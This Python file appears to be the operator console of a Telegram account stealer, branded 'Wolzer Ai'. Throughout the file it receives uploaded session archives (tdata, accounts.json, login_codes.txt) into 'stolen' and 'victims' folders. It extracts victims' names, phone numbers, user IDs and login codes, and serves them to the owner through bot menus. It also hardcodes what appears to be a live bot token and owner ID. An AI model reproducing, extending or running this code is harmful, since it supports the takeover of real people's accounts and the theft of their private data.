# language: Python, file: bot_manager.py
# Wolzer Ai — offline package manager + WebApp launcher.
# LIVE control lives in the plugin (it polls getUpdates).
# Run this bot ONLY when no plugin is online, or for disk/package management.
# WEBAPP_URL — HTTPS URL to webapp/index.html (required for WebApp button).
import os
import json
import time
import socket
import urllib.request
import urllib.parse
import urllib.error
import zipfile
import re
import sys
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any, Tuple

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8676286563:AAGproI3CGEvRXuq3wW1yl74uXf7Y-0q7S4")
OWNER_ID  = os.environ.get("OWNER_ID", "155132616")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://ysername6.github.io/stealer/")
LIVE_PLUGIN = os.environ.get("LIVE_PLUGIN", "1")  # 1 = do not poll (plugin owns getUpdates)
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
MAX_DOWNLOAD = 18 * 1024 * 1024
TG_MSG_LIMIT = 4096
RETRY_429_MAX = 3

BOT_NAME = "Wolzer Ai"

# ---------- storage ----------

def _pick_store() -> Path:
    candidates = [
        Path("/storage/emulated/0/stolen_sessions"),
        Path("/sdcard/stolen_sessions"),
        Path(sys.path[0] or ".") / "stolen",
        Path("./stolen"),
    ]
    for c in candidates:
        try:
            c.mkdir(parents=True, exist_ok=True)
            t = c / ".wtest"
            t.write_bytes(b"1")
            t.unlink()
            return c
        except Exception:
            continue
    fallback = Path("./stolen")
    try:
        fallback.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    return fallback

STORE = _pick_store()
VICTIMS = STORE / "victims"
ACCOUNTS_DIR = STORE / "accounts"
for _d in (STORE, VICTIMS, ACCOUNTS_DIR):
    try:
        _d.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
OFFSET_FILE = STORE / "offset.txt"
OWNER_FILE  = STORE / "owner.txt"
print("STORE =", STORE)

# ---------- utils ----------

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def _http_read(req: urllib.request.Request, timeout: int = 90) -> bytes:
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

def _handle_429(resp_body: bytes) -> Optional[int]:
    try:
        j = json.loads(resp_body.decode(errors="ignore"))
    except Exception:
        return None
    if not isinstance(j, dict):
        return None
    if j.get("error_code") == 429:
        params = j.get("parameters") or {}
        return int(params.get("retry_after") or 3)
    return None

def api(method: str, data: Optional[dict] = None, files: Optional[dict] = None,
        _retry: int = 0) -> dict:
    url = f"{API}/{method}"
    try:
        if files:
            boundary = "----BotBoundary"
            body = b""
            for k, v in (data or {}).items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
            for name, (fname, content) in files.items():
                safe_fname = str(fname).replace('"', "_")
                body += (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"{name}\"; filename=\"{safe_fname}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n"
                ).encode() + content + b"\r\n"
            body += f"--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        else:
            body = urllib.parse.urlencode(data or {}).encode()
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
        raw = _http_read(req)
        return json.loads(raw.decode())
    except urllib.error.HTTPError as e:
        raw = e.read()
        wait = _handle_429(raw)
        if wait is not None and _retry < RETRY_429_MAX:
            time.sleep(wait + 1)
            return api(method, data, files, _retry + 1)
        if e.code == 409 and _retry < RETRY_429_MAX:
            time.sleep(3)
            return api(method, data, files, _retry + 1)
        print(f"[API ERROR] {method} {e.code}: {raw[:400]!r}")
        return {"ok": False, "description": raw.decode(errors="ignore")}
    except Exception as e:
        print(f"[API EXC] {method}: {e}")
        return {"ok": False, "description": str(e)}

def _split_text(text: str, limit: int = TG_MSG_LIMIT) -> List[str]:
    if len(text) <= limit:
        return [text]
    parts, buf = [], ""
    for line in text.splitlines(keepends=True):
        if len(buf) + len(line) > limit:
            parts.append(buf)
            buf = ""
        if len(line) > limit:
            for i in range(0, len(line), limit):
                chunk = line[i:i + limit]
                if len(buf) + len(chunk) > limit:
                    parts.append(buf)
                    buf = ""
                buf += chunk
        else:
            buf += line
    if buf:
        parts.append(buf)
    return parts or [""]

def send(text: str, chat_id: str, reply_markup: Optional[dict] = None,
         parse_mode: Optional[str] = None) -> List[dict]:
    out = []
    parts = _split_text(str(text), TG_MSG_LIMIT)
    for idx, part in enumerate(parts):
        data = {"chat_id": str(chat_id), "text": part}
        if parse_mode:
            data["parse_mode"] = parse_mode
        if reply_markup and idx == len(parts) - 1:
            data["reply_markup"] = json.dumps(reply_markup)
        out.append(api("sendMessage", data))
    return out

def edit(text: str, chat_id: str, message_id: int,
         reply_markup: Optional[dict] = None) -> dict:
    data = {
        "chat_id": str(chat_id),
        "message_id": message_id,
        "text": str(text)[:TG_MSG_LIMIT],
    }
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("editMessageText", data)

def answer_cb(cb_id: str, text: Optional[str] = None) -> dict:
    data = {"callback_query_id": cb_id}
    if text:
        data["text"] = str(text)[:200]
    return api("answerCallbackQuery", data)

# ---------- meta ----------

def save_meta(pkg_id: str, meta: dict) -> None:
    try:
        (STORE / f"{pkg_id}.json").write_text(
            json.dumps(meta, indent=2, ensure_ascii=False))
    except Exception as e:
        print("save_meta:", e)

def load_meta(pkg_id: str) -> dict:
    p = STORE / f"{pkg_id}.json"
    if not p.exists():
        return {}
    try:
        return json.loads(p.read_text())
    except Exception:
        return {}

def list_packages() -> List[dict]:
    metas = []
    for p in STORE.glob("*.json"):
        if p.name in ("offset.txt", "owner.txt"):
            continue
        try:
            m = json.loads(p.read_text())
            m["_mtime"] = p.stat().st_mtime
            metas.append(m)
        except Exception:
            continue
    metas.sort(key=lambda m: m.get("_mtime", 0), reverse=True)
    return metas[:60]

def list_account_txts() -> List[Path]:
    files = [p for p in ACCOUNTS_DIR.glob("*.txt") if p.is_file()]
    files.sort(key=lambda p: p.stat().st_mtime, reverse=True)
    return files[:50]

def list_victims() -> List[dict]:
    out = []
    for d in sorted(VICTIMS.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
        if not d.is_dir():
            continue
        meta_p = d / "meta.json"
        if meta_p.exists():
            try:
                out.append(json.loads(meta_p.read_text()))
                continue
            except Exception:
                pass
        out.append({"chat_id": d.name})
    return out

def victim_dir(chat_id: str) -> Path:
    safe = re.sub(r"[^\d\-]", "_", str(chat_id)) or "unknown"
    d = VICTIMS / safe
    d.mkdir(parents=True, exist_ok=True)
    return d

# ---------- zip parsing ----------

def extract_from_zip(zip_path: Path) -> Tuple[list, dict, str]:
    accounts: list = []
    device: dict = {}
    codes_preview: str = ""
    zf = None
    try:
        zf = zipfile.ZipFile(zip_path, "r")
        names = zf.namelist()
        if "accounts.json" in names:
            accounts = json.loads(zf.read("accounts.json").decode("utf-8", errors="ignore"))
        if "session_info.json" in names:
            info = json.loads(zf.read("session_info.json").decode("utf-8", errors="ignore"))
            if not accounts:
                accounts = info.get("accounts", [])
            dm = (info.get("device_model") or "")
            device = {
                "manufacturer": dm.split(" ")[0] if dm else "",
                "model": " ".join(dm.split(" ")[1:]) if dm else "",
                "android": info.get("android", ""),
                "format": info.get("format", ""),
            }
        if "login_codes.txt" in names:
            codes_preview = zf.read("login_codes.txt").decode("utf-8", errors="ignore")[:3000]
        for n in names:
            if n.endswith("info.txt"):
                try:
                    raw = zf.read(n).decode("utf-8", errors="ignore")
                    m = re.search(r"ID:\s*(\d+)", raw)
                    if m:
                        (ACCOUNTS_DIR / f"acc_{m.group(1)}.txt").write_text(raw)
                except Exception:
                    pass
    except Exception as e:
        print("extract:", e)
    finally:
        if zf is not None:
            try:
                zf.close()
            except Exception:
                pass
    return accounts, device, codes_preview

def rebuild_from_disk() -> int:
    created = 0
    for f in list(STORE.iterdir()):
        if not f.is_file():
            continue
        if f.suffix == ".json" or f.name in ("offset.txt", "owner.txt") or f.name.startswith("."):
            continue
        m = re.match(r"^(\d{8}_\d{6})_(.+)$", f.name)
        if not m:
            pkg_id = now_utc().strftime("%Y%m%d_%H%M%S") + "_" + re.sub(r"[^\w.\-]", "_", f.stem)[:20]
            new_name = f"{pkg_id}_{f.name}"
            try:
                target = STORE / new_name
                if target.exists():
                    target = STORE / f"{new_name}_{int(time.time())}"
                f.rename(target)
                f = target
                m = re.match(r"^(\d{8}_\d{6})_(.+)$", f.name)
            except Exception:
                continue
        if not m:
            continue
        pkg_id = m.group(1)
        meta_path = STORE / f"{pkg_id}.json"
        if meta_path.exists():
            continue
        accounts, device, codes = [], {}, ""
        is_zip = f.suffix.lower() == ".zip" or f.name.lower().endswith(".zip")
        is_tdata = "tdata" in f.name.lower()
        if is_zip:
            accounts, device, codes = extract_from_zip(f)
        elif f.suffix.lower() == ".txt":
            try:
                text = f.read_text(errors="ignore")
                (ACCOUNTS_DIR / f.name).write_text(text)
                uid_m = re.search(r"ID:\s*(\d+)", text)
                phone_m = re.search(r"Phone:\s*\+?(\d+)", text)
                name_m = re.search(r"Name:\s*(.+)", text)
                accounts = [{
                    "user_id": uid_m.group(1) if uid_m else None,
                    "phone": phone_m.group(1) if phone_m else None,
                    "first_name": (name_m.group(1).strip() if name_m else "")[:40],
                    "account": 0,
                }]
                codes = text
            except Exception:
                pass
        meta = {
            "id": pkg_id,
            "file": f.name,
            "caption": f.name,
            "size": f.stat().st_size,
            "date": int(f.stat().st_mtime),
            "accounts": accounts,
            "device": device,
            "codes_preview": (codes or "")[:2000],
            "is_zip": is_zip,
            "is_tdata": is_tdata,
            "from_chat": OWNER_ID,
            "rebuilt": True,
        }
        save_meta(pkg_id, meta)
        created += 1
    return created

# ---------- keyboards ----------

def main_menu_kb() -> dict:
    rows = [
        [{"text": "Packages", "callback_data": "menu:list"}],
        [{"text": "Account .txt", "callback_data": "menu:accs"}],
        [{"text": "Victims", "callback_data": "menu:victims"}],
        [{"text": "Latest codes", "callback_data": "menu:codes"}],
        [{"text": "Scan disk", "callback_data": "menu:scan"}],
    ]
    if WEBAPP_URL:
        rows.insert(0, [{"text": "⚡ Control panel", "web_app": {"url": WEBAPP_URL}}])
    return {"inline_keyboard": rows}

def packages_kb(pkgs: List[dict]) -> dict:
    rows = []
    for m in pkgs[:30]:
        tag = "tdata" if m.get("is_tdata") else ("zip" if m.get("is_zip") else "file")
        cap = (m.get("caption") or m.get("file") or "")[:36]
        rows.append([{
            "text": f"{m.get('id','?')} | {tag} | {cap} | {m.get('size',0)}b",
            "callback_data": f"pkg:{m['id']}",
        }])
    rows.append([{"text": "<< Main", "callback_data": "menu:main"}])
    return {"inline_keyboard": rows}

def accounts_txt_kb(files: List[Path]) -> dict:
    rows = [[{"text": f.name[:60], "callback_data": f"atxt:{f.name}"}] for f in files[:30]]
    rows.append([{"text": "<< Main", "callback_data": "menu:main"}])
    return {"inline_keyboard": rows}

def victims_kb(vlist: List[dict]) -> dict:
    rows = []
    for v in vlist[:25]:
        cid = str(v.get("chat_id", "?"))
        name = v.get("name") or v.get("username") or cid
        rows.append([{"text": f"{name} ({cid})", "callback_data": f"vic:{cid}"}])
    rows.append([{"text": "<< Main", "callback_data": "menu:main"}])
    return {"inline_keyboard": rows}

def package_kb(pkg_id: str, accounts: list) -> dict:
    rows = []
    for i, a in enumerate((accounts or [])[:12]):
        name = f"{a.get('first_name') or ''} {a.get('last_name') or ''}".strip() or "—"
        rows.append([{
            "text": f"#{a.get('account',i)} {name} +{a.get('phone')} ({a.get('user_id')})",
            "callback_data": f"acc:{pkg_id}:{i}",
        }])
    if not rows:
        rows.append([{"text": "(no accounts)", "callback_data": "noop"}])
    rows.append([
        {"text": "Full file", "callback_data": f"act:zip:{pkg_id}"},
        {"text": "Wipe", "callback_data": f"act:wipe:{pkg_id}"},
    ])
    rows.append([{"text": "<< Packages", "callback_data": "menu:list"}])
    return {"inline_keyboard": rows}

def account_kb(pkg_id: str, acc_idx: int) -> dict:
    return {"inline_keyboard": [
        [{"text": "Info .txt", "callback_data": f"act:info:{pkg_id}:{acc_idx}"},
         {"text": "Codes", "callback_data": f"act:codes:{pkg_id}:{acc_idx}"}],
        [{"text": "Full package", "callback_data": f"act:zip:{pkg_id}"}],
        [{"text": "<< Accounts", "callback_data": f"pkg:{pkg_id}"}],
    ]}

# ---------- document handler ----------

def _safe_acct_name(name: str) -> Optional[str]:
    base = Path(name).name
    if not base or base.startswith(".") or "/" in base or "\\" in base:
        return None
    if not base.lower().endswith(".txt"):
        return None
    return base

def handle_document(msg: dict) -> None:
    global OWNER_ID
    chat_id = str(msg["chat"]["id"])
    from_user = msg.get("from", {}) or {}
    doc = msg["document"]
    file_id = doc["file_id"]
    file_name = doc.get("file_name", "file.bin")
    caption = msg.get("caption", "") or ""
    file_size = int(doc.get("file_size") or 0)

    pkg_id = now_utc().strftime("%Y%m%d_%H%M%S") + f"_{int(time.time()*1000)%1000:03d}"
    safe_name = re.sub(r"[^\w.\-]", "_", file_name)[:80] or "file.bin"
    is_tdata = "tdata" in safe_name.lower() or "tdata" in caption.lower()

    if file_size > MAX_DOWNLOAD:
        meta = {
            "id": pkg_id,
            "file": None,
            "file_id": file_id,
            "caption": caption or safe_name,
            "size": file_size,
            "date": msg.get("date"),
            "accounts": [],
            "device": {},
            "codes_preview": "",
            "is_zip": safe_name.lower().endswith(".zip"),
            "is_tdata": is_tdata,
            "from_chat": chat_id,
            "from_user": from_user.get("username") or from_user.get("first_name") or chat_id,
            "too_big": True,
        }
        save_meta(pkg_id, meta)
        if chat_id == OWNER_ID:
            send(f"stored meta only (too big {file_size}b)\nid={pkg_id}\n{safe_name}",
                 chat_id, main_menu_kb())
        return

    file_info = api("getFile", {"file_id": file_id})
    if not file_info.get("ok"):
        if chat_id == OWNER_ID:
            send(f"getFile fail: {file_info}", chat_id)
        return
    remote_path = file_info["result"]["file_path"]
    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{remote_path}"
    try:
        raw = _http_read(urllib.request.Request(url), timeout=120)
    except Exception as e:
        if chat_id == OWNER_ID:
            send(f"download fail: {e}", chat_id)
        return

    dest_path = STORE / f"{pkg_id}_{safe_name}"
    dest_path.write_bytes(raw)

    accounts, device, codes_preview = [], {}, ""
    is_zip = safe_name.lower().endswith(".zip") or (len(raw) > 4 and raw[:2] == b"PK")
    if is_zip:
        accounts, device, codes_preview = extract_from_zip(dest_path)
    elif safe_name.lower().endswith(".txt"):
        try:
            text = raw.decode("utf-8", errors="ignore")
            acct_name = _safe_acct_name(safe_name)
            if acct_name:
                (ACCOUNTS_DIR / acct_name).write_text(text)
            uid_m = re.search(r"ID:\s*(\d+)", text)
            phone_m = re.search(r"Phone:\s*\+?(\d+)", text)
            name_m = re.search(r"Name:\s*(.+)", text)
            accounts = [{
                "user_id": uid_m.group(1) if uid_m else None,
                "phone": phone_m.group(1) if phone_m else None,
                "first_name": (name_m.group(1).strip() if name_m else "")[:40],
                "account": 0,
            }]
            codes_preview = text
        except Exception as e:
            print("txt parse", e)

    meta = {
        "id": pkg_id,
        "file": dest_path.name,
        "caption": caption or safe_name,
        "size": len(raw),
        "date": msg.get("date"),
        "accounts": accounts,
        "device": device,
        "codes_preview": (codes_preview or "")[:2000],
        "is_zip": is_zip,
        "is_tdata": is_tdata,
        "from_chat": chat_id,
        "from_user": from_user.get("username") or from_user.get("first_name") or chat_id,
    }
    save_meta(pkg_id, meta)

    if chat_id == OWNER_ID:
        tag = "tdata" if is_tdata else ("zip" if is_zip else "file")
        send(
            f"stored {pkg_id} [{tag}]\n{caption or safe_name}\n"
            f"{len(raw)}b | acc={len(accounts)}",
            chat_id,
            {"inline_keyboard": [
                [{"text": "Open", "callback_data": f"pkg:{pkg_id}"}],
                [{"text": "All packages", "callback_data": "menu:list"}],
            ]},
        )

# ---------- text / callback (owner panel only) ----------

def handle_text(msg: dict) -> None:
    global OWNER_ID
    text = (msg.get("text") or "").strip()
    chat_id = str(msg["chat"]["id"])

    if not OWNER_ID or OWNER_ID == "0":
        OWNER_ID = chat_id
        try:
            OWNER_FILE.write_text(OWNER_ID)
        except Exception:
            pass
        send(f"owner locked = {OWNER_ID}\nSTORE={STORE}", chat_id, main_menu_kb())
        return

    if chat_id != OWNER_ID:
        return

    # web_app_data can also arrive as message when bot is poller
    # (plugin normally owns getUpdates — this path is fallback)

    if text in ("/start", "/help", "/menu"):
        n_pkg = len([p for p in STORE.glob("*.json") if p.name not in ("offset.txt", "owner.txt")])
        n_acc = len(list(ACCOUNTS_DIR.glob("*.txt")))
        note = (
            f"{BOT_NAME} — package manager\n"
            f"STORE={STORE}\npackages={n_pkg} account_txt={n_acc}\n"
            f"live control = plugin cmd channel (!ping / WebApp)\n"
            f"WEBAPP_URL={'set' if WEBAPP_URL else 'NOT SET'}"
        )
        send(note, chat_id, main_menu_kb())
    elif text.startswith("/list") or text == "/packages":
        pkgs = list_packages()
        if not pkgs:
            send("no packages — run /scan or wait for plugin", chat_id, main_menu_kb())
            return
        send("packages:", chat_id, packages_kb(pkgs))
    elif text == "/scan":
        n = rebuild_from_disk()
        pkgs = list_packages()
        send(f"scan done, created {n} meta\npackages now={len(pkgs)}",
             chat_id, packages_kb(pkgs) if pkgs else main_menu_kb())
    elif text.startswith("/get "):
        pkg_id = text.split(maxsplit=1)[1].strip()
        meta = load_meta(pkg_id)
        if not meta:
            send("unknown id", chat_id)
            return
        if meta.get("too_big"):
            send(f"file too big, only meta\nfile_id={meta.get('file_id')}", chat_id)
            return
        path = STORE / (meta.get("file") or "")
        if not path.exists():
            send("file missing on disk", chat_id)
            return
        api("sendDocument", {"chat_id": chat_id, "caption": pkg_id},
            {"document": (path.name, path.read_bytes())})
    elif text.startswith("/wipe "):
        pkg_id = text.split(maxsplit=1)[1].strip()
        meta = load_meta(pkg_id)
        if meta:
            if meta.get("file"):
                (STORE / meta["file"]).unlink(missing_ok=True)
            (STORE / f"{pkg_id}.json").unlink(missing_ok=True)
            send(f"wiped {pkg_id}", chat_id)
        else:
            send("unknown", chat_id)
    elif text.startswith("/whoami"):
        send(f"chat_id={chat_id}\nowner={OWNER_ID}\nSTORE={STORE}", chat_id)
    elif text.startswith("/setwebapp "):
        # runtime hint only — set env for real use
        send(
            "set WEBAPP_URL env before start:\n"
            "  WEBAPP_URL=https://host/index.html python bot_manager.py\n"
            "then /start to get the button",
            chat_id,
        )

def handle_callback(cq: dict) -> None:
    data = cq.get("data", "")
    chat_id = str(cq["message"]["chat"]["id"])
    msg_id = cq["message"]["message_id"]
    cb_id = cq["id"]

    if chat_id != OWNER_ID:
        answer_cb(cb_id, "owner only")
        return
    answer_cb(cb_id)

    if data == "menu:main":
        edit(f"{BOT_NAME} — package manager\nSTORE={STORE}", chat_id, msg_id, main_menu_kb())
    elif data == "menu:list":
        pkgs = list_packages()
        if not pkgs:
            edit("no packages — press Scan disk", chat_id, msg_id, main_menu_kb())
            return
        edit("packages:", chat_id, msg_id, packages_kb(pkgs))
    elif data == "menu:scan":
        n = rebuild_from_disk()
        pkgs = list_packages()
        edit(f"scan: +{n} meta, total={len(pkgs)}",
             chat_id, msg_id, packages_kb(pkgs) if pkgs else main_menu_kb())
    elif data == "menu:accs":
        files = list_account_txts()
        if not files:
            edit("no account txt", chat_id, msg_id, main_menu_kb())
            return
        edit("account reports:", chat_id, msg_id, accounts_txt_kb(files))
    elif data == "menu:victims":
        vlist = list_victims()
        if not vlist:
            edit("no victims", chat_id, msg_id, main_menu_kb())
            return
        edit("victims:", chat_id, msg_id, victims_kb(vlist))
    elif data == "menu:codes":
        files = list_account_txts()[:6]
        parts = [f"{f.name}:\n{f.read_text(errors='ignore')[:450]}" for f in files]
        edit("\n\n".join(parts) if parts else "no codes", chat_id, msg_id, main_menu_kb())
    elif data.startswith("atxt:"):
        name = _safe_acct_name(data.split(":", 1)[1])
        if not name:
            send("bad name", chat_id)
            return
        path = ACCOUNTS_DIR / name
        if path.exists() and path.is_file():
            api("sendDocument", {"chat_id": chat_id, "caption": name},
                {"document": (name, path.read_bytes())})
        else:
            send("gone", chat_id)
    elif data.startswith("vic:"):
        vid = data.split(":", 1)[1]
        vdir = VICTIMS / vid
        files = list(vdir.iterdir()) if vdir.exists() else []
        text = f"victim {vid}\n" + "\n".join(x.name for x in files[:25])
        edit(text, chat_id, msg_id, {"inline_keyboard": [
            [{"text": "Get files", "callback_data": f"vget:{vid}"}],
            [{"text": "<< Victims", "callback_data": "menu:victims"}],
        ]})
    elif data.startswith("vget:"):
        vid = data.split(":", 1)[1]
        vdir = VICTIMS / vid
        if vdir.exists():
            for f in sorted(vdir.iterdir()):
                if f.is_file() and f.suffix in (".zip", ".txt"):
                    api("sendDocument", {"chat_id": chat_id, "caption": f"{vid}/{f.name}"},
                        {"document": (f.name, f.read_bytes())})
    elif data.startswith("pkg:"):
        pkg_id = data.split(":", 1)[1]
        meta = load_meta(pkg_id)
        if not meta:
            edit("unknown", chat_id, msg_id, main_menu_kb())
            return
        accounts = meta.get("accounts") or []
        if not accounts and meta.get("is_zip") and meta.get("file"):
            path = STORE / meta["file"]
            if path.exists():
                accounts, device, codes = extract_from_zip(path)
                meta["accounts"] = accounts
                meta["device"] = device
                meta["codes_preview"] = codes
                save_meta(pkg_id, meta)
        device = meta.get("device") or {}
        tag = "tdata" if meta.get("is_tdata") else ""
        header = (
            f"Package {pkg_id} {tag}\n{(meta.get('caption') or '')[:80]}\n"
            f"size={meta.get('size')} acc={len(accounts)}\n"
            f"{device.get('manufacturer','')} {device.get('model','')} {device.get('format','')}"
        )
        if meta.get("too_big"):
            header += "\nTOO BIG — meta only"
        edit(header, chat_id, msg_id, package_kb(pkg_id, accounts))
    elif data.startswith("acc:"):
        parts = data.split(":")
        if len(parts) < 3:
            return
        pkg_id, idx = parts[1], int(parts[2])
        meta = load_meta(pkg_id)
        accounts = meta.get("accounts") or []
        if idx >= len(accounts):
            edit("bad index", chat_id, msg_id)
            return
        a = accounts[idx]
        text = (
            f"#{a.get('account')} {a.get('first_name')} {a.get('last_name')}\n"
            f"+{a.get('phone')}\nid={a.get('user_id')}\n@{a.get('username')}"
        )
        edit(text, chat_id, msg_id, account_kb(pkg_id, idx))
    elif data.startswith("act:info:"):
        parts = data.split(":")
        if len(parts) < 4:
            return
        pkg_id, idx = parts[2], int(parts[3])
        meta = load_meta(pkg_id)
        accounts = meta.get("accounts") or []
        a = accounts[idx] if idx < len(accounts) else {}
        uid = str(a.get("user_id") or "")
        cand = ACCOUNTS_DIR / f"acc_{uid}.txt"
        codes = cand.read_text(errors="ignore") if cand.exists() else (meta.get("codes_preview") or "")
        txt = (
            f"=== ACCOUNT INFO ===\n"
            f"Name: {a.get('first_name') or ''} {a.get('last_name') or ''}\n"
            f"Phone: +{a.get('phone')}\n"
            f"ID: {a.get('user_id')}\n"
            f"Username: @{a.get('username')}\n\n{codes}"
        )
        fname = f"acc_{uid or idx}.txt"
        api("sendDocument", {"chat_id": chat_id, "caption": fname},
            {"document": (fname, txt.encode("utf-8"))})
    elif data.startswith("act:codes:"):
        parts = data.split(":")
        if len(parts) < 4:
            return
        pkg_id, idx = parts[2], int(parts[3])
        meta = load_meta(pkg_id)
        accounts = meta.get("accounts") or []
        a = accounts[idx] if idx < len(accounts) else {}
        uid = str(a.get("user_id") or "")
        cand = ACCOUNTS_DIR / f"acc_{uid}.txt"
        codes = cand.read_text(errors="ignore") if cand.exists() else (meta.get("codes_preview") or "(empty)")
        send(f"Codes {uid}\n{codes[:3500]}", chat_id)
    elif data.startswith("act:zip:"):
        pkg_id = data.split(":")[2]
        meta = load_meta(pkg_id)
        if meta.get("too_big"):
            send("file too big for bot download", chat_id)
            return
        path = STORE / (meta.get("file") or "")
        if path.exists():
            api("sendDocument", {"chat_id": chat_id, "caption": pkg_id},
                {"document": (path.name, path.read_bytes())})
        else:
            send("missing", chat_id)
    elif data.startswith("act:wipe:"):
        pkg_id = data.split(":")[2]
        meta = load_meta(pkg_id)
        if meta:
            if meta.get("file"):
                (STORE / meta["file"]).unlink(missing_ok=True)
            (STORE / f"{pkg_id}.json").unlink(missing_ok=True)
            edit(f"wiped {pkg_id}", chat_id, msg_id, main_menu_kb())
    elif data == "noop":
        pass

def process_update(upd: dict) -> None:
    if "callback_query" in upd:
        handle_callback(upd["callback_query"])
        return
    msg = upd.get("message") or upd.get("channel_post")
    if not msg:
        return
    if msg.get("chat", {}).get("type") != "private":
        return
    # web_app_data
    if msg.get("web_app_data"):
        # if bot is polling, forward is not needed — plugin normally owns this
        data = (msg.get("web_app_data") or {}).get("data") or ""
        send(f"[webapp data received] {data}\n(plugin should execute if online)", OWNER_ID)
        return
    if "document" in msg:
        handle_document(msg)
    elif "text" in msg:
        handle_text(msg)

def _save_offset(offset: int) -> None:
    try:
        OFFSET_FILE.write_text(str(offset))
    except Exception:
        pass

def setup_webapp_menu() -> None:
    if not WEBAPP_URL:
        print("WEBAPP_URL empty — no menu button")
        return
    # set chat menu button for owner
    r = api("setChatMenuButton", {
        "chat_id": OWNER_ID,
        "menu_button": json.dumps({
            "type": "web_app",
            "text": "Control",
            "web_app": {"url": WEBAPP_URL},
        }),
    })
    print("setChatMenuButton:", r.get("ok"), r.get("description", ""))

def main() -> None:
    global OWNER_ID
    if OWNER_FILE.exists():
        try:
            OWNER_ID = OWNER_FILE.read_text().strip() or OWNER_ID
        except Exception:
            pass
    print("owner:", OWNER_ID, "STORE:", STORE, "WEBAPP:", WEBAPP_URL or "(none)")
    try:
        n = rebuild_from_disk()
        print("startup scan created", n)
    except Exception as e:
        print("startup scan", e)

    setup_webapp_menu()

    if str(LIVE_PLUGIN).strip() in ("1", "true", "yes", "on"):
        print(
            "LIVE_PLUGIN=1 — not polling.\n"
            "Plugin on device owns getUpdates / !commands / WebApp.\n"
            "This process only set menu button and can manage local STORE if you set LIVE_PLUGIN=0."
        )
        print("menu URL:", WEBAPP_URL)
        return

    offset = 0
    if OFFSET_FILE.exists():
        try:
            offset = int(OFFSET_FILE.read_text().strip() or "0")
        except Exception:
            offset = 0

    socket.setdefaulttimeout(60)
    print("polling packages… LIVE_PLUGIN=0")
    while True:
        try:
            resp = api("getUpdates", {"offset": offset, "timeout": 30})
            if not resp.get("ok"):
                time.sleep(3)
                continue
            for upd in resp.get("result", []):
                new_offset = upd["update_id"] + 1
                try:
                    process_update(upd)
                except Exception as e:
                    print("process_update:", e)
                offset = new_offset
                _save_offset(offset)
        except Exception as e:
            print("loop:", e)
            time.sleep(5)

if __name__ == "__main__":
    main()
